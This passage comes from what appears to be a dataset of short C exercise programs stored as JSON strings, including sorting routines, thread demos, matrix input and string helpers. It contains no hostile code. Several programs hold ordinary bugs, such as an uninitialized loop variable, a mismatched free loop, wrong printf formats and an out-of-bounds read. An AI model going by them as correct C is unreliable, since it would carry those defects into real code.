for(x=0; x<SIZE; x++) {\n            printf(\"%.0f \",perlin2d(x, y, 0.1, 4) * 100);\n        }\n        printf(\"\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int i, j;\n    int n;\n    int arr[105];\n    scanf(\"%d\", &n);\n    for ( i = 0; i < n; i++ )\n        scanf(\"%d\", &arr[i]);\n    int ans = arr[0];\n    for ( i = 0; i < n; i++ )\n    {\n        int tmp = arr[i];\n        if ( tmp > ans )\n            ans = tmp;\n        for ( j = i+1; j < n; j++ )\n        {\n            tmp ^= arr[j];\n            if ( tmp > ans )\n                ans = tmp;\n        }\n    }\n    printf(\"%d\\n\", ans);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n int *i, *j=0;\n float *f = ((void*)0);\n printf(\"\\nValue of i: %u\", i);\n printf(\"\\nValue of j: %u\", j);\n printf(\"\\nValue of f: %u\", f);\n return 0;\n}",
    "#include <stdio.h>\nint nested(int n)\n{\n  if (n > 100)\n    return n - 10;\n  return nested(nested(n + 11));\n}\nint main()\n{\n  printf(\"%d\\n\", nested(95));\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main (){\n    int **p;\n    int i,j,n,m;\n    printf(\"LINHAS: \");\n    scanf(\"%i\",&n);\n    printf(\"COLUNAS: \");\n    scanf(\"%i\",&m);\n    p=(int **) malloc (n*sizeof(int *));\n    for(i=0;i<n;i++){\n        p[i]=(int *) malloc(m*sizeof(int));\n        for(j=0;j<m;j++){\n            printf(\"%i%i: \",i,j);\n            scanf(\"%i\",&p[i][j]);\n        }\n    }\n    printf(\"\\n\");\n    for(i=0;i<n;i++){\n        for(j=0;j<m;j++){\n            printf(\"%i%i:  %i   |   \",i+1,j+1,p[i][j]);\n        }\n        printf(\"\\n\");\n    }\n    for(i=0;i<m;i++){\n        free(p[i]);\n    }\n    free(p);\n    p=((void*)0);\n    return 0;\n}",
    "#include<stdio.h>\n#include<limits.h>\n#include<stdlib.h>\nvoid printArray(int *A, int n)\n{\n    for (int i = 0; i < n; i++)\n    {\n        printf(\"%d \", A[i]);\n    }\n    printf(\"\\n\");\n}\nint maximum(int A[], int n){\n    int max = (-2147483647 -1);\n    for (int i = 0; i < n; i++)\n    {\n        if (max < A[i]){\n            max = A[i];\n        }\n    }\n    return max;\n}\nvoid countSort(int * A, int n){\n    int i, j;\n    int max = maximum(A, n);\n    int* count = (int *) malloc((max+1)*sizeof(int));\n    for (i = 0; i < max+1; i++)\n    {\n        count[i] = 0;\n    }\n    for (i = 0; i < n; i++)\n    {\n        count[A[i]] = count[A[i]] + 1;\n    }\n    i =0;\n    j =0;\n    while(i<= max){\n        if(count[i]>0){\n            A[j] = i;\n            count[i] = count[i] - 1;\n            j++;\n        }\n        else{\n            i++;\n        }\n    }\n}\nint main(){\n    int A[] = {10,36,22,1,50,33,19};\n    int n = sizeof(A)/sizeof(A[0]);\n    printArray(A, n);\n    countSort(A, n);\n    printArray(A, n);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <math.h>\n\n\nvoid printFile(FILE*);\nint main() {\n puts(\"Enter input file name:\");\n char inputFileName[50];\n fgets(inputFileName, 50, (stdin));\n inputFileName[strlen(inputFileName) - 1] = '\\0';\n FILE *inputFile;\n if ((inputFile = fopen(inputFileName, \"r+b\")) == ((void*)0)) {\n  perror(\"An error occurred while trying to open the output file for writing\");\n  system(\"pause\");\n  return 1;\n }\n puts(\"File contents:\");\n printFile(inputFile);\n double first, last;\n fseek(inputFile, 0, (0));\n fread(&first, sizeof(double), 1, inputFile);\n fseek(inputFile, -sizeof(double), (2));\n fread(&last, sizeof(double), 1, inputFile);\n printf(\"First: %lf Last: %lf\\n\", first, last);\n if (fabs(first) > 1e-6 || fabs(last) > 1e-6) {\n  fseek(inputFile, 0, (0));\n  double current;\n  while (fread(&current, sizeof(double), 1, inputFile) == 1) {\n   if (fabs(current) < 1e-6) {\n    continue;\n   }\n   fseek(inputFile, -sizeof(double), (1));\n   if (current > 0) {\n    current += first;\n   }\n   else {\n    current -= last;\n   }\n   fwrite(&current, sizeof(double), 1, inputFile);\n   fseek(inputFile, 0, (1));\n  }\n }\n puts(\"New file contents:\");\n printFile(inputFile);\n fclose(inputFile);\n system(\"pause\");\n return 0;\n}\nvoid printFile(FILE *file) {\n fseek(file, 0, (0));\n double current;\n while (fread(&current, sizeof(double), 1, file) >= 1) {\n  printf(\"%lf\\n\", current);\n }\n}",
    "#include <stdio.h>\nint main(void) {\n    int x = -50, y = 30;\n    int absoluteX = (x > 0) ? x : -x;\n    int max = (x > y) ? x : y;\n    int min = (x < y) ? x : y;\n    printf(\"x \uc758 \uc808\ub313\uac12\uc740 %d\uc785\ub2c8\ub2e4.\\n\", absoluteX);\n    printf(\"x \uc640 y \uc911\uc5d0\uc11c \ucd5c\ub313\uac12\uc740 %d \uc785\ub2c8\ub2e4.\\n\", max);\n    printf(\"x \uc640 y \uc911\uc5d0\uc11c \ucd5c\uc19f\uac12\uc740 %d \uc785\ub2c8\ub2e4.\\n\", min);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char *argv[])\n{\n int m[4][5], l, c, pares = 0;\n printf(\"Informe 20 valores inteiros para a matriz A:\\n\\n\");\n for(l = 0; l < 4; l++)\n {\n  for(c = 0; c < 5; c++)\n  {\n   printf(\"Valor para a pos %d %d: \", l, c);\n   scanf(\"%d\", &m[l][c]);\n   if(m[l][c] > 0 && m[l][c] % 2 == 0)\n   {\n    pares++;\n   }\n  }\n }\n printf(\"\\n\\nOs 20 valores foram lidos!\\n\");\n system(\"pause\");\n system(\"cls\");\n printf(\"Quantidade de valores pares lidos: %d \", pares);\n return 0;\n}",
    "#include<stdio.h>\nint main(void)\n{\n int x,i;\n printf(\"Enter the Value :\");\n scanf(\"%d\",&i);\n for(x=1;x<=i;x++)\n {\n  printf(\"%d\\n\",x);\n }\n return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n int a[50],n,i,j,temp;\n printf(\"Enter the size of array: \");\n scanf(\"%d\",&n);\n printf(\"Enter the array elements: \");\n for(i=0;i<n;++i)\n  scanf(\"%d\",&a[i]);\n for(i=1;i<n;++i)\n  for(j=0;j<(n-i);++j)\n   if(a[j]>a[j+1])\n   {\n    temp=a[j];\n    a[j]=a[j+1];\n    a[j+1]=temp;\n   }\n printf(\"\\nArray after sorting: \");\n for(i=0;i<n;++i)\n  printf(\"%d \",a[i]);\n return 0;\n}",
    "#include <stdio.h>\nint factorial(int n)\n{\n    int result = 1;\n    for(int i = 1; i <= n; i++)\n    {\n        result = result * i;\n    }\n    return result;\n}\nint main()\n{\n    int n;\n    printf(\"Enter value of n: \");\n    scanf(\"%d\", &n);\n    int ans = factorial(n);\n    printf(\"Factorial(%d) = %d\\n\", n, ans);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\n\nvoid displayMST(int graph[4][4], int markedCell[4][4]){\n    int r, c , sum = 0;\n    for(r = 0; r < 4 -1; r++){\n        for(c = r+1; c < 4; c++){\n            if(markedCell[r][c]){\n                printf(\"Edge: %d -- %d\\tWeight: %d\\n\", r, c, graph[r][c]);\n                sum += graph[r][c];\n            }\n        }\n    }\n    printf(\"The total cost of MST is: %d\",sum);\n}\nvoid prim(int graph[4][4]){\n    int i, r, c, solved = 0, count = 0, min, expectedR, expectedC;\n    int markedCell[4][4] = {{0}};\n    int markedVertex[4] = {0};\n    markedVertex[0] = 1;\n    while(!solved){\n        min = 9999;\n        count = 0;\n        expectedR = -1;\n        expectedC = -1;\n        for (r = 0; r < 4; r++){\n            if(markedVertex[r] == 1){\n                for(c = r; c < 4; c++){\n                    if(graph[r][c] != 0 && graph[r][c] < min && !markedCell[r][c]){\n                        min = graph[r][c];\n                        expectedR = r;\n                        expectedC = c;\n                    }\n                }\n            }\n        }\n        if(expectedR != -1 && expectedC != -1){\n            markedCell[expectedR][expectedC] = 1;\n            markedCell[expectedC][expectedR] = 1;\n            markedVertex[expectedR] = 1;\n            markedVertex[expectedC] = 1;\n        }\n        for(i = 0; i < 4; i++){\n            if(markedVertex[i]){\n                count++;\n            }\n        }\n        if(count == 4){\n            solved = 1;\n        }\n    }\n    displayMST(graph, markedCell);\n}\nint main(){\n    int graph[4][4] = {\n        {0, 5, 10, 9999},\n        {5, 0, 4, 11},\n        {10, 4, 0, 5},\n        {9999, 11, 5, 0}};\n    prim(graph);\n    return 0;\n}",
    "#include<stdio.h>\nint main(){\n    int num, i, opcao, maior ;\n    printf(\"digite um numero: \");\n    scanf(\" %d\",&num);\n    maior = num ;\n    while(i>0){\n       printf(\"digite um numero: \");\n       scanf(\" %d\",&num);\n       printf(\"deseja continuar ? (1-sim ou 0-nao): \");\n       scanf(\" %d\",&opcao);\n       if (num > maior ){\n           maior = num ;\n       }\n       i = opcao ;\n    }\n    printf(\"o maior valor %d\",maior);\n}",
    "#include<stdio.h>\nlong long f(int n)\n{\n int i;\n long long m;\n m=1;\n for(i=1;i<=n;i++)\n {\n  m=m*i;\n }\n return m;\n }\nint main()\n{\n int m,n;\n long long m1,n1,a;\n scanf(\"%d%d\",&m,&n);\n m1=f(m);\n n1=f(n);\n a=f(m-n);\n if(m==n)\n printf(\"1\\n\");\n else if(m==0||n==0)\n printf(\"0\\n\");\n else\n printf(\"%d\\n\",m1/(n1*a));\n return 0;\n}",
    "#include <stdio.h>\nint main() {\n int a, b;\n scanf(\"%d%d\", &a, &b);\n if (a == 2) {\n  if (b == 18) puts(\"Special\");\n  else if (b > 18) puts(\"After\");\n  else puts(\"Before\");\n }\n else if (a < 2) puts(\"Before\");\n else puts(\"After\");\n}",
    "#include <stdio.h>\nint divide(int a, int b, int *result);\nint main()\n{\n    int a = 5;\n    int b = 2;\n    int c;\n    if (divide(a, b, &c))\n        printf(\"%d / %d = %d\\n\", a, b, c);\n    return 0;\n}\nint divide(int a, int b, int *result)\n{\n    int ret = 1;\n    if (b == 0)\n        ret = 0;\n    else\n        *result = a / b;\n    return ret;\n}",
    "#include<stdio.h>\nvoid mystrncpy(char *s, char *t, int n);\nvoid mystrncat(char *s, char *t, int n);\nint mystrncmp(char *s, char *t, int n);\nint main(int argc, char *argv[])\n{\n    char greeting[] = \"Hello folk!\";\n    mystrncpy(greeting, \"Howdy!\", 5);\n    printf(\"copy: %s\\n\", greeting);\n    mystrncat(greeting, \" Welcome. :)\", 9);\n    printf(\"cat: %s\\n\", greeting);\n    int result = mystrncmp(greeting, \"Howdy\", 5);\n    printf(\"cmp: %s\\n\", result ? \"equal\" : \"not equal\");\n    return 0;\n}\nvoid mystrncpy(char *s, char *t, int n)\n{\n    while(n-- && *s != '\\0' && *t != '\\0') {\n        *s++ = *t++;\n    }\n    if (n > 0) {\n        *s = 0;\n    }\n}\nvoid mystrncat(char *s, char *t, int n)\n{\n    while (*s != '\\0') {\n        s++;\n    }\n    while (n-- && *t != '\\0') {\n        *s = *t;\n        s++;\n        t++;\n    }\n    *s = '\\0';\n}\nint mystrncmp(char *s, char *t, int n)\n{\n    while(n-- && *s != '\\0' && *t != '\\0') {\n        if (*s != *t) {\n            return 0;\n        }\n        s++;\n        t++;\n    }\n    return 1;\n}",
    "#include <stdio.h>\nint main() {\n int a = 10, b = 11;\n int *p, *q;\n p = &a;\n q = p;\n printf(\"a = %d %d %d \\n\", a, *p, *q);\n q = &b;\n *q = *p;\n printf(\"b = %d %d %d\", a, *p, *q);\n}",
    "#include <stdio.h>\nint silnia(int);\nint main()\n{\n    int liczba;\n    printf(\"Podaj liczbe: \");\n    scanf(\"%i\",&liczba);\n    if(liczba<0)\n    {\n        printf(\"Nie mozna policzyc silnie z ujemnej liczby\\n\");\n    }\n    else\n    {\n        printf(\"%i! = %i\",liczba,silnia(liczba));\n    }\n    return 0;\n}\nint silnia(int liczba)\n{\n    int wynik=1;\n    if (liczba == 0)\n    {\n        return 1;\n    }\n    else\n    {\n        if(liczba==1)\n        {\n            return 1;\n        }\n        else\n        {\n            while(liczba>0)\n            {\n                wynik *= liczba;\n                liczba--;\n            }\n            return wynik;\n        }\n    }\n}",
    "#include <stdio.h>\nint main() {\n    int h1, m1, h2, m2;\n    while (scanf(\"%d %d %d %d\", &h1, &m1, &h2, &m2)) {\n        if (!h1 && !m1 && !h2 && !m2)\n            break;\n        if (h1 > h2 || h1 == h2 && m1 > m2)\n            h2 += 24;\n        printf(\"%d\\n\", (h2 * 60 + m2) - (h1 * 60 + m1));\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nunsigned int is_number(char *str){\n  unsigned int total_ints, i;\n  char *letter;\n  total_ints = 0;\n  i=0;\n  letter = ((void*)0);\n  while( *(letter = &str[i]) != '\\0'){\n    if ( *letter >= '0' && *letter <= '9'){\n      total_ints++;\n    }else{\n      return 0;\n    }\n    i++;\n  }\n  return (total_ints != i) ? 0 : total_ints;\n}\nint main(int argc, char *argv[]){\n  if (argc<2){\n    printf(\"Usage: %s your_string_here\\n\", argv[0]);\n    return -1;\n  }\n  return is_number(argv[1]);\n}",
    "#include <stdio.h>\nint main(void)\n{\n    int distance = 100;\n    double numero2= 7.98;\n    float numero3=67.67f;\n    int numero4=-7;\n    double numero5=-6.09;\n    char caracter='@';\n    char texto[11]=\"Hola mundo\";\n    printf(\"\\nTu tienes %d kilometros de ditancia(variable int)\\n\", distance);\n    printf(\"\\nTu tienes %d kilometros de ditancia(variable int)\\n\", distance,6);\n    printf(\"\\nTu tienes %lf kilometros de ditancia(variable double)\\n\", numero2);\n    printf(\"\\nTu tienes %g kilometros de ditancia(variable double)\\n\", numero2);\n    printf(\"\\nTu tienes %f kilometros de ditancia(variable float)\\n\", numero3);\n    printf(\"\\nTu tienes %d kilometros de ditancia(variable int)\\n\", numero4);\n    printf(\"\\nTu tienes %lf kilometros de ditancia(variable double)\\n\", numero5);\n    printf(\"\\nTu tienes %c kilometros de ditancia(variable char carcater)\\n\", caracter);\n    printf(\"\\nTu tienes texto %s kilometros de ditancia por el caracter texto[11](variable char vector)\\n\", texto);\n    printf(\"\\n\");\n    return 0;\n}",
    "#include <stdio.h>\nint strcmp(const char *s1, const char *s2)\n{\n    while (*s1 && *s2 && *s1 == *s2) ++s1, ++s2;\n    return (unsigned char)*s1 - (unsigned char)*s2;\n}\nint main(void)\n{\n    char s1[256], s2[256];\n    printf(\"s1: \");\n    if (scanf(\"%255[^\\n]%*[^\\n]\", s1) != 1) {\n        return 1;\n    }\n    scanf(\"%*c\");\n    printf(\"s2: \");\n    if (scanf(\"%255[^\\n]%*[^\\n]\", s2) != 1) {\n        return 1;\n    }\n    scanf(\"%*c\");\n    printf(\"strcmp(s1, s2) = %d\\n\", strcmp(s1, s2));\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n    int n, casais = 0;\n    scanf(\"%d\", &n);\n    int vet[n];\n    for(int i = 0; i < n; i++){\n        scanf(\"%d\", &vet[i]);\n    }\n    for(int i = 0; i < n; i++){\n        for(int j = i+1; j < n; j++){\n            if(vet[i] == vet[j]*-1 && vet[i] != 0){\n                vet[i] = 0;\n                vet[j] = 0;\n                casais++;\n                break;\n            }\n        }\n    }\n    printf(\"%d\", casais);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint lengthOfLIS(int* nums, int numsSize) {\n    int* tails = malloc(numsSize * sizeof(int));\n    int size = 0;\n    for (int k = 0; k < numsSize; k++) {\n        int x = nums[k];\n        int i = 0;\n        int j = size;\n        while (i != j) {\n            int m = (i + j) / 2;\n            if (tails[m] < x) {\n                i = m + 1;\n            } else {\n                j = m;\n            }\n        }\n        tails[i] = x;\n        if (i == size) {\n            ++size;\n        }\n    }\n    free(tails);\n    return size;\n}\nint main() {\n    int arr[] = {4, 5, 6, 3};\n    printf(\"%d\\n\", lengthOfLIS(arr, sizeof(arr)/sizeof(int)));\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <pthread.h>\n#include <time.h>\n\n\nint *array;\nint max;\nint max_pos;\nint size;\npthread_mutex_t mutex;\nvoid *search(void *arg)\n{\n    int id = *((int *)arg);\n    int i;\n    int local_max = 0;\n    int local_max_pos = 0;\n    int start = id * (size / 4);\n    int end = (id + 1) * (size / 4);\n    if (id == 4 - 1)\n        end = size;\n    for (i = start; i < end; i++)\n    {\n        if (array[i] > local_max)\n        {\n            local_max = array[i];\n            local_max_pos = i;\n        }\n    }\n    pthread_mutex_lock(&mutex);\n    if (\n        local_max > max)\n    {\n        max = local_max;\n        max_pos = local_max_pos;\n    }\n    pthread_mutex_unlock(&mutex);\n    pthread_exit(((void*)0));\n}\nint main(int argc, char *argv[])\n{\n    int i;\n    int *id;\n    pthread_t threads[4];\n    pthread_attr_t attr;\n    pthread_attr_init(&attr);\n    pthread_attr_setdetachstate(&attr, 0);\n    pthread_mutex_init(&mutex, ((void*)0));\n    printf(\"Ingrese el tama\u00f1o del arreglo: \");\n    scanf(\"%d\", &size);\n    array = (int *)malloc(sizeof(int) * size);\n    srand(time(((void*)0)));\n    max = rand() % size;\n    max_pos = rand() % size;\n    array[max_pos] = max;\n    for (i = 0; i < size; i++)\n    {\n        if (i != max_pos)\n            array[i] = rand() % size;\n    }\n    for (i = 0; i < 4; i++)\n    {\n        id = (int *)malloc(sizeof(int));\n        *id = i;\n        pthread_create(&threads[i], &attr, search, (void *)id);\n    }\n    for (i = 0; i < 4; i++)\n    {\n        pthread_join(threads[i], ((void*)0));\n    }\n    printf(\"El valor m\u00e1ximo es %d y est\u00e1 en la posici\u00f3n %d\\n\", max, max_pos);\n    pthread_attr_destroy(&attr);\n    pthread_mutex_destroy(&mutex);\n    pthread_exit(((void*)0));\n}",
    "#include <stdio.h>\n#include <ctype.h>\nint main(){\n char name[255];\n printf(\"Type a name\\n\");\n fgets(name, 100, (stdin));\n if (name[0] == 'a' || name[0] == 'A'){\n  printf(\"%s\\n\", name);\n }else{\n  printf(\"NO\\n\");\n }\n return 0;\n}",
    "#include <unistd.h>\nvoid ft_putchar(char c)\n{\n write(1, &c, 1);\n}\nvoid rev_print(char *str)\n{\n int i;\n i = 0;\n while (str[i])\n  i++;\n i--;\n while (str[i])\n {\n  ft_putchar(str[i]);\n  i--;\n }\n}\nint main(int argc, char **argv)\n{\n if (argc == 2)\n  rev_print(argv[1]);\n write(1, \"\\n\", 1);\n return (0);\n}",
    "#include <stdlib.h>\n#include <string.h>\n#include <stdio.h>\n\nint check_vowel(char c)\n{\n  switch(c) {\n    case 'a':\n    case 'A':\n    case 'e':\n    case 'E':\n    case 'i':\n    case 'I':\n    case 'o':\n    case 'O':\n    case 'u':\n    case 'U':\n      return 1;\n    default:\n      return 0;\n  }\n}\nint copyConsonants(int numChars, char* bufferIn, char* bufferOut) {\n  int count = 0;\n  for (int i = 0; i < numChars; i++) {\n    if(check_vowel(bufferIn[i])==0) {\n      bufferOut[count] = bufferIn[i];\n      count++;\n    }\n  }\n  bufferOut[count] = '\\0';\n  return count;\n}\nvoid disemvowel(FILE* in, FILE* out) {\n  int chars;\n  int others;\n  char bufferIn[1024];\n  chars = fread(bufferIn, sizeof(char), 1024, in);\n  char bufferOut[chars];\n  others = copyConsonants(chars, bufferIn, bufferOut);\n  fwrite(bufferOut, sizeof(char), others, out);\n}\nint main(int argc, char *argv[]) {\n  FILE *in;\n  FILE *out;\n  if (argc == 1) {\n    in = (stdin);\n    out = (stdout);\n    disemvowel(in, out);\n  }\n  else if (argc == 2) {\n    in = fopen(argv[1], \"r\");\n    out = (stdout);\n    disemvowel(in, out);\n  }\n  else if (argc == 3) {\n    in = fopen(argv[1], \"r\");\n    out = fopen(argv[2], \"w\");\n    disemvowel(in, out);\n  } else {\n    printf(\"Invalid # arguments.\");\n    exit(0);\n  }\nfclose(in);\nfclose(out);\nreturn 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int num,check;\n    scanf(\"%d\",&num);\n    check=num&1;\n    switch (check)\n    {\n    case 0:\n        printf(\"%d is the Even Number\\n\",num);\n        break;\n    case 1:\n        printf(\"%d is the Odd Number\\n\",num);\n        break;\n    default:\n        printf(\"Out of range\");\n        break;\n    }\n    return 0;\n}",
    "#include <time.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include <pthread.h>\ndouble bank_balance = 0.0;\ndouble ivan_account = 0.0;\ndouble petar_account = 0.0;\npthread_mutex_t mutex;\nvoid deposit(double amount, double *to) {\n pthread_mutex_lock(&mutex);\n *to += amount;\n bank_balance += amount;\n pthread_mutex_unlock(&mutex);\n}\nvoid withdraw(double amount, double *from) {\n pthread_mutex_lock(&mutex);\n *from -= amount;\n bank_balance -= amount;\n pthread_mutex_unlock(&mutex);\n}\nvoid *ivan(void *arg) {\n int i;\n for(i = 0; i < 1000000; i++) {\n  if(rand() % 2 <= 1) {\n   deposit(rand() % 10000, &ivan_account);\n  }\n  else {\n   withdraw(rand() % 10000, &ivan_account);\n  }\n }\n}\nvoid *petar(void *arg) {\n int i;\n for(i = 0; i < 1000000; i++) {\n  if(rand() % 1000 <= 500) {\n   deposit(rand() % 10000, &petar_account);\n  }\n  else {\n   withdraw(rand() % 10000, &petar_account);\n  }\n }\n}\nint main() {\n srand(time(((void*)0)));\n int mutexInitializationError = pthread_mutex_init(&mutex, ((void*)0));\n if (mutexInitializationError)\n {\n  printf(\"Mutex was not initialized!\\n\");\n  return 0;\n }\n pthread_t thread1;\n pthread_t thread2;\n pthread_create(&thread1, ((void*)0), petar, ((void*)0));\n pthread_create(&thread2, ((void*)0), ivan, ((void*)0));\n pthread_join(thread1, ((void*)0));\n pthread_join(thread2, ((void*)0));\n printf(\"%f %f\\n\", ivan_account + petar_account, bank_balance);\n return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char const *argv[])\n{\n    int nb1 = 0;\n    int nb2 = 0;\n    sscanf(argv[1], \"%d\", &nb1);\n    sscanf(argv[2], \"%d\", &nb2);\n    printf(\"%d \\n\", nb1 * nb2);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <pthread.h>\n\nint test_array1[100000];\nint test_array2[100000];\nvoid init_test_array(int *array) {\n   int i, j;\n   for(i = 100000,j=0; i >= 0; i--,j++)\n      array[j] = i;\n}\nstatic void *bubble1(void* val) {\n   static int i, temp, elemente=100000;\n   printf(\"Thread bubble1() started\\n\");\n   while(elemente--)\n      for(i = 1; i <= elemente; i++)\n         if(test_array1[i-1] > test_array1[i]) {\n            temp=test_array1[i];\n            test_array1[i]=test_array1[i-1];\n            test_array1[i-1]=temp;\n         }\n   printf(\"Thread bubble1() finished\\n\");\n   return ((void*)0);\n}\nstatic void *bubble2(void* val) {\n   static int i, temp, elemente=100000;\n   printf(\"Thread bubble2() started\\n\");\n   while(elemente--)\n      for(i = 1; i <= elemente; i++)\n         if(test_array2[i-1] > test_array2[i]) {\n            temp=test_array2[i];\n            test_array2[i]=test_array2[i-1];\n            test_array2[i-1]=temp;\n         }\n   printf(\"Thread bubble2() finished\\n\");\n   return ((void*)0);\n}\nint main (void) {\n    pthread_t thread1, thread2;\n    int i, rc;\n    freopen(\"myoutput.txt\", \"w+\", (stdout));\n    printf(\"main thread main() started\\n\");\n    init_test_array(test_array1);\n    init_test_array(test_array2);\n    rc = pthread_create( &thread1, ((void*)0), &bubble1, ((void*)0) );\n    if( rc != 0 ) {\n        printf(\"couldn't create thread 1\\n\");\n        return 1;\n    }\n    rc = pthread_create( &thread2, ((void*)0), &bubble2, ((void*)0) );\n    if( rc != 0 ) {\n        printf(\"couldn't create thread 2\\n\");\n        return 1;\n    }\n    pthread_join( thread1, ((void*)0) );\n    pthread_join( thread2, ((void*)0) );\n    for(i = 0; i < 100000; i++) {\n       printf(\"[%d-%d]\", test_array1[i], test_array2[i]);\n    }\n    printf(\"\\nmain-thread main() finished\\n\");\n    return 0;\n}",
    "#include<stdio.h>\nint main(){\n int num, opt;\n printf(\"\\nEnter a number: \");\n scanf(\"%d\",&num);\n printf(\"\\n Options:\\n1.Check if number is divisible by 10\\n2.Check if number is divisible by 2\\nEnter: \");\n scanf(\"%d\",&opt);\n switch(opt){\n  case 1: {\n   if(num%10==0)\n    printf(\"\\n%d is divisible by 10.\\n\",num);\n   else\n    printf(\"\\n%d is not divisible by 10.\\n\",num);\n   break;\n  }\n  case 2: {\n   if(num%2==0)\n    printf(\"\\n%d is divisible by 2.\\n\",num);\n   else\n    printf(\"\\n%d is not divisible by 2.\\n\",num);\n   break;\n  }\n  default: printf(\"\\nPlease enter a valid option\\n\"); break;\n }\n}",
    "#include<stdio.h>\nint main(){\n int n;\n scanf(\"%d\", &n);\n int a[n];\n for(int i=0;i<n;i++){\n  scanf(\"%d\", &a[i]);\n }\n int l=0, r=n-1;\n while(l<=r){\n  if(a[l]!=a[r]){\n   printf(\"0\");\n   return 0;\n  }\n   l++;\n   r--;\n }\n printf(\"1\");\n}",
    "#include <stdio.h>\n#include <math.h>\nint main(){\n char nom1[20],nom2[20],a1[5],a2[5];\n    int d1=0,d2=0,h1=0,h2=0,m1=0,m2=0,s1=0,s2=0;\n    scanf(\"%s %d\",nom1,&d1);\n    scanf(\"%d %s %d %s %d\",&h1,a1,&m1,a2,&s1);\n    scanf(\"%s %d\",nom2,&d2);\n    scanf(\"%d %s %d %s %d\",&h2,a1,&m2,a2,&s2);\n    int m=0,s=0,h=0,d=0;\n    d=d2-d1;\n    if(h2<h1){\n  d--;\n  h2+=24;\n }\n h=h2-h1;\n if(m2<m1){\n  h--;\n  m2+=60;\n }\n m=m2-m1;\n if(s2<s1){\n  m--;\n  s2+=60;\n }\n s=s2-s1;\n    printf(\"%d dia(s)\\n%d hora(s)\\n%d minuto(s)\\n%d segundo(s)\\n\",d,h,m,s);\n return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nvoid cal(int max){\n    double out=0;\n    for(int i=1;i<=max;i++){\n        out+=4*(pow(-1.0,i+1.0)/(2.0*i-1.0));\n    }\n    printf(\"%lf\\n\",out);\n}\nint main(){\n    for(int i=10000;i<=100000;i+=10000)cal(i);\n}",
    "int func(int arg1, int arg2){\n  return arg1 + arg2;\n}\nint main(){\n  func(123, 456);\n  return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    short x;\n    unsigned char i = 0;\n    scanf(\"%hd\", &x);\n    for (; i < 10; i++) {\n        printf(\"N[%hhu] = %hd\\n\", i, x);\n        x *= 2;\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int n=0;\n    while(scanf(\"%d\", &n) != (-1))\n        printf(\"%d\\n\\n\", (n%2)?(n+1)/2*n : n/2*(n+1));\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <math.h>\n#include <stdlib.h>\nint main() {\n    int t;\n    char s[100000];\n    scanf(\"%d\",&t);\n    for (int i=0 ; i< t; i++){\n        scanf(\"%s\",s);\n        int len_str = strlen(s);\n        int count =0;\n        for(int j=0 ; j< len_str; j++){\n            if(s[j]==s[j+1]){\n                count += 1;\n            }\n        }\n        printf(\"%d\\n\",count);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n int vetor[6]={1,2,6,4,5,3};\n int i;\n for(i=0;i<6;i++)\n {\n  if(vetor[i] == 6)\n  {\n   printf (\"%d\\n\",i);\n   break;\n  }\n }\n return 0;\n}",
    "#include<stdio.h>\nint insertion_Sort(int a[],int n)\n{\n int s,t,i,j,x;\n for(j=1;j<n;j++)\n {\n  x=1;\n  s=a[j];\n  i=j-1;\n  while(x==1)\n  {\n   if(s<a[i])\n   {\n    i=i-1;\n    if(i==-1)\n    {\n     x=0;\n    }\n   }\n   else\n    x=0;\n  }\n  t=j;\n  while(t>i+1)\n  {\n   a[t]=a[t-1];\n   t=t-1;\n  }\n  a[i+1]=s;\n }\n printf(\"\\n========================================================================================\\n\");\n printf(\"\\nThe Elements After Sorting = \");\n for(i=0;i<n;i++)\n {\n  printf(\"\\t%d\",a[i]);\n }\n printf(\"\\n========================================================================================\\n\");\n return 0;\n}\nint main()\n{\n int i,n;\n printf(\"How many elements you want to enter inside the array?\\n\");\n scanf(\"%d\",&n);\n int a[n];\n for(i=0;i<n;i++)\n {\n  printf(\"\\nEnter the value you want to enter inside Array\\n\");\n  scanf(\"%d\",&a[i]);\n }\n printf(\"\\n========================================================================================\\n\");\n printf(\"\\nThe Elements You Entered =\");\n for(i=0;i<n;i++)\n {\n  printf(\"\\t%d\",a[i]);\n }\n insertion_Sort(&a[0],n);\n return 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\n#include <math.h>\n#include <time.h>\ndouble mp_integral = 0;\ndouble func(double x) {\n double f = 1.5 * (1 - x * x);\n return f;\n}\nvoid midpoint(int dim, const int dim_stor, const int intervals, double *x) {\n    if(dim == 0) {\n  double f = 1;\n  for (int i = 0; i < dim_stor; i++) f *= func(x[i]);\n  mp_integral += f/pow(intervals, dim_stor);\n }\n    else {\n        for (int i = 0; i < intervals; i++) {\n   x[dim - 1] = (i + 0.5)/intervals;\n   midpoint(dim - 1, dim_stor, intervals, x);\n  }\n    }\n}\nvoid montecarlo(int dim, int samples) {\n clock_t time = clock();\n double result = 0, x, f;\n for (int j = 0; j < samples; j++) {\n  f = 1;\n  for (int k = 0; k < dim; k++) {\n   x = drand48();\n   f *= func(x);\n  }\n  result += f/samples;\n }\n time = clock() - time;\n printf(\"I_mc(dim = %d) = %10.7g\\t(took %g sec)\\n\", dim, result, (double) time/((clock_t)1000000000));\n}\nint main() {\n const int dim = 12, intervals = 6, samples = 2e4;\n for (int i = 1; i <= dim; i++) {\n  clock_t time = clock();\n  double x[i];\n  midpoint(i, i, intervals, x);\n  time = clock() - time;\n  printf(\"I_mp(dim = %d) = %10.7g\\t(took %g sec)\\n\", i, mp_integral, (double) 